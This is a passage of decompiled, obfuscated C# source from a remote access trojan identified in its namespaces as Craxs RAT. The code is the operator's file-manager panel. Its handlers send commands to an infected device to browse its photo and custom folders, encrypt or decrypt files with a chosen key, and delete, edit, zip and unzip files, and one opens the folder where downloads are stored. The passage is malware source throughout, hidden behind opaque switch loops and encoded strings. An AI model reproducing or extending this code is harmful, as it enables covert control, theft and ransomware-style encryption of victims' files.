              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00337113D02 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031D380A16 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032B59264C + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0031A0B0E44),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00314496105),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num2 * 1715356636 ^ 2143685645;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DirectoryDCIMToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 2130815211;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-~(num1 + (--798269268 + -(1540867884 - 929232351 - 1955506456) ^ -921042205 * (-1131152345 * -959816439) * -1023740633 ^ ~(1901404242 - -1723692974) * 180188575) - ~(1204819791 * -(1498029872 - -2022602832))) * -1208319787)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00313577947 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033F34786E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030975020C + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0032F06100C),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0033B176D5B),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num2 * 410328526 ^ -73660020;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void CustomToolStripMenuItem_Click(object sender, EventArgs e)
    {
      inp lc1 = new inp();
label_1:
      int num1 = 1059439311;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~(~num1 * -1202922713) - (786033026 - 464796030 ^ ~-1729328243)) + 759184104)) % 8U)
        {
          case 0:
            num1 = (int) num2 * 231765663 ^ 989789269;
            continue;
          case 1:
            int num3;
            num1 = num3 = ((Jector) this).classClient == null ? 1595830269 : (num3 = 145541426);
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003745F1A5A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00350753376 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager._Closure\u0024__.getfiles + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030F676F5B + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + lc1.InputText.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003534B3962),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num2 * -1386280644 ^ -1876807996;
            continue;
          case 3:
            goto label_1;
          case 4:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -1895301892 ^ 1010489037;
            continue;
          case 6:
            int num4 = lc1.ShowDialog((IWin32Window) this) == DialogResult.OK ? 372641723 : (num4 = -1776586398);
            num1 = num4 ^ (int) num2 * 1842616227;
            continue;
          case 7:
            lc1.Text = EXGuarder.\u00359641C43;
            lc1.LTitle.Text = EXGuarder.\u00352530325;
            lc1.InputText.Text = this.DGV0.Tag.ToString().Length == 0 ? EXGuarder.\u0031F4D252E : this.DGV0.Tag.ToString();
            lc1.StartPosition = FormStartPosition.Manual;
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            num1 = -761696306;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      lc1.Close();
    }

    private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -481545755;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((num1 * 2040215915 - (~-1457060737 - (450750453 ^ -1983140857) - 98863215 ^ (-1126764517 - -1814541490 - ~-1054256565) * -134355353) ^ 28367298) - 632931068 - (-960485258 ^ 1997604243))) % 6U)
        {
          case 0:
            Directory.CreateDirectory(str);
            num1 = (int) num2 * -1329518455 ^ -1884389031;
            continue;
          case 1:
            int num3 = Directory.Exists(str) ? -1884601412 : (num3 = 1161969051);
            num1 = num3 ^ (int) num2 * 1505181035;
            continue;
          case 2:
            goto label_8;
          case 3:
            Process.Start(str);
            num1 = 393124410;
            continue;
          case 4:
            goto label_1;
          case 5:
            // ISSUE: reference to a compiler-generated field
            str = ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).FolderUSER + EXGuarder.\u00355770E01;
            num1 = (int) num2 * 935932638 ^ 2083027085;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -2017290832;
      inp lc1;
      string str1;
      string str2;
      int length;
      int index;
      string str3;
      string Left;
      DialogResult dialogResult;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-~num1 * 326500375)) % 25U)
        {
          case 0:
            str3 = str1 + EXGuarder.\u00303286726;
            num1 = 1486742095;
            continue;
          case 1:
            str3 = str1.Substring(0, length);
            num1 = (int) num3 * -1970961370 ^ 115160000;
            continue;
          case 2:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -805602825 ^ -9916000;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003410E1030 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00359611766 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003475B4246 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str3 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + lc1.InputText.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0034C4D3F30),
              (object) ((Jector) this).classClient
            });
            num1 = 425255526;
            continue;
          case 4:
            int num4 = this.DGV0.SelectedRows.Count <= 0 ? -2018055140 : (num4 = -809731262);
            num1 = num4 ^ (int) num3 * 691712185;
            continue;
          case 5:
            num1 = (int) num3 * -462975511 ^ 555553622;
            continue;
          case 6:
            str3 = (string) null;
            str2 = EXGuarder.\u00328324E06;
            int num5 = !str1.EndsWith(str2) ? -2090955597 : (num5 = 1239064351);
            num1 = num5 ^ (int) num3 * 1170726342;
            continue;
          case 7:
            Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
            num1 = 2000096255;
            continue;
          case 8:
            int num6 = Operators.CompareString(Left, EXGuarder.\u0032F47012A, false) != 0 ? 1078899302 : (num6 = 785085190);
            num1 = num6 ^ (int) num3 * -2056053372;
            continue;
          case 9:
            goto label_1;
          case 10:
            int num7;
            num1 = num7 = ((Jector) this).classClient == null ? -274289670 : (num7 = -104157095);
            continue;
          case 11:
            num1 = (int) num3 * -1709271565 ^ 1229285886;
            continue;
          case 12:
            lc1 = new inp();
            num1 = (int) num3 * 47911047 ^ -1610828357;
            continue;
          case 13:
            num1 = (int) num3 * -1654171473 ^ -148881845;
            continue;
          case 14:
            int num8;
            num1 = num8 = index >= 0 ? 203409331 : (num8 = -274289670);
            continue;
          case 15:
            int num9 = dialogResult == DialogResult.OK ? -1598507484 : (num9 = 1128314326);
            num1 = num9 ^ (int) num3 * 210614050;
            continue;
          case 16:
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            dialogResult = lc1.ShowDialog((IWin32Window) this);
            num1 = (int) num3 * 1069111542 ^ 882840244;
            continue;
          case 17:
            length = str1.LastIndexOf(str2);
            num1 = (int) num3 * 1007915746 ^ -550742854;
            continue;
          case 18:
            index = num2;
            num1 = (int) num3 * 209226535 ^ -1308438619;
            continue;
          case 19:
            goto label_27;
          case 20:
            lc1.Text = EXGuarder.\u0031419090F;
            lc1.LTitle.Text = EXGuarder.\u0034B304A61;
            // ISSUE: reference to a compiler-generated method
            lc1.InputText.Text = MySettings.get_Settings().EncryptionKey;
            num1 = (int) num3 * 1629557387 ^ 1129805559;
            continue;
          case 21:
            checked { index += -1; }
            num1 = 1296158682;
            continue;
          case 22:
            lc1.Close();
            num1 = 594422280;
            continue;
          case 23:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003125D7560), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = (int) num3 * 1902069437 ^ 1788911725;
            continue;
          case 24:
            lc1.StartPosition = FormStartPosition.Manual;
            num1 = (int) num3 * 124632252 ^ -866795331;
            continue;
          default:
            goto label_28;
        }
      }
label_27:
      return;
label_28:;
    }

    private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 457121909;
      inp lc1;
      string str;
      object[] ParametersObjects;
      int index;
      string Left;
      DialogResult dialogResult;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~((~num1 ^ 1251704384 ^ 1622589849 * (362551400 - 1672208744) + (1412523099 - 1681191486 + ~-1515656749)) - 799331449 ^ -1433841896 ^ -1382018625) - 1264872557)) % 23U)
        {
          case 0:
            checked { index += -1; }
            num1 = -920334686;
            continue;
          case 1:
            num1 = (int) num2 * -519548485 ^ -1632992555;
            continue;
          case 2:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 780043634 ^ 329501081;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().EncryptionKey = lc1.InputText.Text;
            num1 = (int) num2 * -1879615942 ^ -677977030;
            continue;
          case 4:
            lc1 = new inp();
            num1 = (int) num2 * -276482567 ^ 1595600652;
            continue;
          case 5:
            int num3 = this.DGV0.SelectedRows.Count <= 0 ? 2052372498 : (num3 = -752904351);
            num1 = num3 ^ (int) num2 * 1162642049;
            continue;
          case 6:
            int num4 = dialogResult == DialogResult.OK ? -1074898245 : (num4 = -1797044798);
            num1 = num4 ^ (int) num2 * -1714212073;
            continue;
          case 7:
            lc1.Close();
            num1 = 409725504;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated method
            lc1.InputText.Text = MySettings.get_Settings().EncryptionKey;
            lc1.StartPosition = FormStartPosition.Manual;
            num1 = (int) num2 * -749687988 ^ -75140893;
            continue;
          case 9:
            int num5;
            num1 = num5 = ((Jector) this).classClient == null ? -1571798379 : (num5 = 389885523);
            continue;
          case 10:
            num1 = (int) num2 * -2033989009 ^ 2109714315;
            continue;
          case 11:
            int num6;
            num1 = num6 = index >= 0 ? -992359358 : (num6 = -1571798379);
            continue;
          case 12:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * -718560635 ^ -1385254097;
            continue;
          case 13:
            lc1.LTitle.Text = EXGuarder.\u0036C73336A;
            num1 = (int) num2 * 1611400019 ^ 1108217536;
            continue;
          case 14:
            int num7 = Operators.CompareString(Left, EXGuarder.\u0033245296B, false) != 0 ? 1163732560 : (num7 = 272261772);
            num1 = num7 ^ (int) num2 * -1961708054;
            continue;
          case 15:
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00301680542), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = (int) num2 * 1380906398 ^ -835423291;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().Save();
            num1 = (int) num2 * -593360623 ^ 1827528076;
            continue;
          case 17:
            goto label_1;
          case 18:
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            dialogResult = lc1.ShowDialog((IWin32Window) this);
            num1 = (int) num2 * -462173716 ^ 59485672;
            continue;
          case 19:
            goto label_25;
          case 20:
            Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
            num1 = -607911558;
            continue;
          case 21:
            lc1.Text = EXGuarder.\u003012E1173;
            num1 = (int) num2 * -913274206 ^ 45259796;
            continue;
          case 22:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00349365E18 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00307666F21 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033F694770 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u003546A1220 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + lc1.InputText.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00369735940),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num2 * 1952675563 ^ -1946177719;
            continue;
          default:
            goto label_26;
        }
      }
label_25:
      return;
label_26:;
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1655550241;
      string str1;
      int index;
      string Left;
      string str2;
      object[] ParametersObjects;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~(num1 * -327813687 + (~-1792601530 + ~1848734196 ^ 660455063 * -~-685458910))) % 17U)
        {
          case 0:
            str2 = EXGuarder.\u003202D793D;
            num1 = (int) num3 * -1045771234 ^ 324452579;
            continue;
          case 1:
            string prm = str1;
            str1 = EXGuarder.\u0034E540750 + Strings.Space(1) + this.Format_Space(prm);
            num1 = (int) num3 * -772206248 ^ 471488053;
            continue;
          case 2:
            int num4;
            num1 = num4 = index >= 0 ? 26608050 : (num4 = -1707827729);
            continue;
          case 3:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00342520E70), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = (int) num3 * 1211732889 ^ 1703898982;
            continue;
          case 4:
            str2 = EXGuarder.\u0034442052F;
            num1 = (int) num3 * -785159033 ^ 625147517;
            continue;
          case 5:
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = (int) num3 * -995571050 ^ 208895278;
            continue;
          case 6:
            goto label_1;
          case 7:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0036D1E4D43 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00326752775 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + str2 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00340243866),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * 1083770718 ^ -2075533669;
            continue;
          case 8:
            int num5;
            num1 = num5 = ((Jector) this).classClient == null ? 877983980 : (num5 = -539302131);
            continue;
          case 9:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            int num6 = Operators.CompareString(Left, EXGuarder.\u0030B16542A, false) == 0 ? -186725756 : (num6 = 899892779);
            num1 = num6 ^ (int) num3 * 366265704;
            continue;
          case 10:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1416032620 ^ -1501289088;
            continue;
          case 11:
            index = num2;
            num1 = (int) num3 * 1733552942 ^ -1111758086;
            continue;
          case 12:
            goto label_19;
          case 13:
            num1 = (int) num3 * -797925811 ^ 1429430477;
            continue;
          case 14:
            int num7 = Operators.CompareString(Left, EXGuarder.\u0036F756F47, false) != 0 ? 1775070135 : (num7 = 985056826);
            num1 = num7 ^ (int) num3 * -1313404590;
            continue;
          case 15:
            checked { index += -1; }
            num1 = 1149491237;
            continue;
          case 16:
            Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
            num1 = -663216564;
            continue;
          default:
            goto label_20;
        }
      }
label_19:
      return;
label_20:;
    }

    private void EditToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 2126584211;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int num4;
        int index;
        string str;
        object objectValue;
        switch ((num3 = (uint) (((711732249 - 448735425 ^ ~1255090838) * 1535406873 ^ -284474584) - (num2 ^ -1762258039 * (-1282350153 * -478615647 ^ ~2019127873 * 796295797 - -~-1311910144)) - 367962686 - (643096853 + (-227706918 - 379911671)))) % 13U)
        {
          case 0:
            goto label_1;
          case 1:
            checked { index += -1; }
            num1 = -657786256;
            continue;
          case 2:
            int num5 = Operators.ConditionalCompareObjectLessEqual(objectValue, (object) 512000, false) ? -1191616476 : (num5 = -1595689664);
            num1 = num5 ^ (int) num3 * 58730256;
            continue;
          case 3:
            goto label_15;
          case 4:
            num4 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -542778127 ^ 609014191;
            continue;
          case 5:
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003334F245E), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = -124885190;
            continue;
          case 6:
            index = num4;
            num1 = (int) num3 * 798345786 ^ 1920995640;
            continue;
          case 7:
            objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Tag);
            num1 = (int) num3 * 1954269913 ^ 936286925;
            continue;
          case 8:
            int num6 = (int) Interaction.MsgBox((object) string.Format(((Jector) this).FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value)), MsgBoxStyle.Critical, (object) Settings.nameRAT);
            num1 = (int) num3 * -2074570225 ^ 2009157638;
            continue;
          case 9:
            int num7 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u0034E530C55, false) != 0 ? -454915481 : (num7 = -1634833270);
            num1 = num7 ^ (int) num3 * 567001986;
            continue;
          case 10:
            int num8;
            num1 = num8 = ((Jector) this).classClient == null ? -759028639 : (num8 = -1246763496);
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0036108471F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031F682C22 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.editor + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003054E7042 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031E592F0D),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1973730008 ^ 352664649;
            continue;
          case 12:
            int num9;
            num1 = num9 = index >= 0 ? -710378959 : (num9 = -1601411085);
            continue;
          default:
            goto label_16;
        }
      }
label_15:
      return;
label_16:;
    }

    private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = -1585283559;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string Left;
        int num4;
        DialogResult dialogResult;
        inp lc1;
        object[] ParametersObjects;
        StringBuilder stringBuilder;
        string str1;
        switch ((num3 = (uint) ~((1870444465 ^ -1539351248) + ~-1314063654 - 2069451969 - (num2 + ((~-853729460 ^ 1093164696 ^ 528488417) - 1454677529 * (252335842 * 476214883 - 1071581049 * 903257184) * -138651347) - -124423527 * 1527701934))) % 25U)
        {
          case 0:
            int num5 = Operators.CompareString(Left, EXGuarder.\u0033D371E55, false) != 0 ? -1794986070 : (num5 = 1143396258);
            num1 = num5 ^ (int) num3 * 1262417492;
            continue;
          case 1:
            lc1 = new inp();
            lc1.Text = EXGuarder.\u0030A752A44;
            num1 = (int) num3 * -619137282 ^ -21017872;
            continue;
          case 2:
            Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
            num1 = 1707451061;
            continue;
          case 3:
            string str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003665F1F39), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            // ISSUE: reference to a compiler-generated field
            stringBuilder.Append(str2 + Data.VB\u0024StateMachine_39_HandelData.SPL_LINE);
            num1 = (int) num3 * 451813279 ^ -1596343748;
            continue;
          case 4:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * -603417611 ^ -1399467870;
            continue;
          case 5:
            int num6 = stringBuilder.ToString().Length <= 0 ? 311837556 : (num6 = 1721883363);
            num1 = num6 ^ (int) num3 * 1537954267;
            continue;
          case 6:
            lc1.LTitle.Text = EXGuarder.\u00378003E0F;
            num1 = (int) num3 * 165501305 ^ -1763042822;
            continue;
          case 7:
            num1 = (int) num3 * -617324454 ^ 1026838672;
            continue;
          case 8:
            int num7 = this.DGV0.SelectedRows.Count <= 0 ? 910598616 : (num7 = -274113774);
            num1 = num7 ^ (int) num3 * 1891390706;
            continue;
          case 9:
            int num8;
            num1 = num8 = ((Jector) this).classClient == null ? 1578697750 : (num8 = 1813999319);
            continue;
          case 10:
            stringBuilder = new StringBuilder();
            dialogResult = lc1.ShowDialog((IWin32Window) this);
            num1 = (int) num3 * 817407658 ^ 210522096;
            continue;
          case 11:
            goto label_1;
          case 12:
            num1 = (int) num3 * -405625680 ^ -1201316682;
            continue;
          case 13:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0032419571B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00379644E26 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003444D5A4C + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + stringBuilder.ToString() + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031F682128),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * 738303773 ^ 1132796121;
            continue;
          case 14:
            lc1.Close();
            num1 = 1995575376;
            continue;
          case 15:
            goto label_27;
          case 16:
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            num1 = (int) num3 * 1504767315 ^ 1335279347;
            continue;
          case 17:
            int num9 = dialogResult == DialogResult.OK ? -1876352098 : (num9 = -693538321);
            num1 = num9 ^ (int) num3 * 1814247702;
            continue;
          case 18:
            lc1.StartPosition = FormStartPosition.Manual;
            num1 = (int) num3 * -1714140171 ^ 720758957;
            continue;
          case 19:
            num4 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -87378831 ^ 973953810;
            continue;
          case 20:
            int num10;
            num1 = num10 = index >= 0 ? 1176200013 : (num10 = 1726760766);
            continue;
          case 21:
            lc1.InputText.Text = EXGuarder.\u00363413B0D;
            num1 = (int) num3 * 1971665290 ^ 1801709998;
            continue;
          case 22:
            index = num4;
            num1 = (int) num3 * -982150430 ^ 1190129310;
            continue;
          case 23:
            checked { index += -1; }
            num1 = 1419438806;
            continue;
          case 24:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003665F1F39), (object) lc1.InputText.Text));
            num1 = (int) num3 * 109615585 ^ 1641876060;
            continue;
          default:
            goto label_28;
        }
      }
label_27:
      return;
label_28:;
    }

    private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1381848213;
      int index;
      int num2;
      string str1;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (((~(num1 - ~~(686521097 + 365428565 ^ 1231908856 ^ 1374439509 ^ -949701119 ^ 1119865943 - 2102051711)) ^ -(243875669 * -1400497699) ^ -(-473187348 ^ 1674041332)) + -827424067 * (1693924676 ^ 1096687496)) * 239133407 * -292712971)) % 11U)
        {
          case 0:
            int num4;
            num1 = num4 = index >= 0 ? 373945176 : (num4 = -2031074090);
            continue;
          case 1:
            num1 = (int) num3 * -1652357750 ^ 459723758;
            continue;
          case 2:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003581B3652), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = (int) num3 * -2088538729 ^ 1789261472;
            continue;
          case 3:
            index = num2;
            num1 = (int) num3 * 1034899296 ^ -919478747;
            continue;
          case 4:
            goto label_1;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0037033395C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003635B770F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031A6B6233 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0033E357907),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1227898165 ^ -1789122185;
            continue;
          case 6:
            int num5;
